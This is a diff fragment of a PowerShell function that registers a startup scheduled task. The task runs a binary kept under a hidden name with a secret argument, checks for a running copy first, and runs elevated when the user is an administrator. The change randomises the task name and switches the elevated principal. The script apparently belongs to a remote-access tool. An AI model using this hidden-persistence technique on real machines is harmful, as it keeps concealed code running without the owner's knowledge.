@@ -114,13 +114,13 @@ function Create-Sceduled-Task($path, $secret)
         $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c (tasklist /FI 'WINDOWTITLE eq $secret'|findstr $QS_SCHEDULED_TASK_NAME) || $path\$QS_BIN_HIDDEN_NAME -liqs $secret"
         $T = New-ScheduledTaskTrigger -AtStartup
         if(Is-Administrator){
-            $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
+            $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
         }else{
             $P = New-ScheduledTaskPrincipal "$env:USERNAME"
         }
         $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P
         $S = New-ScheduledTaskSettingsSet
-        Register-ScheduledTask "$QS_SCHEDULED_TASK_NAME" -InputObject $D
+        Register-ScheduledTask "${QS_SCHEDULED_TASK_NAME}_${RAND_NAME}" -InputObject $D | out-null
     }catch {
         Print-Debug $_.Exception
         throw $_.Exception
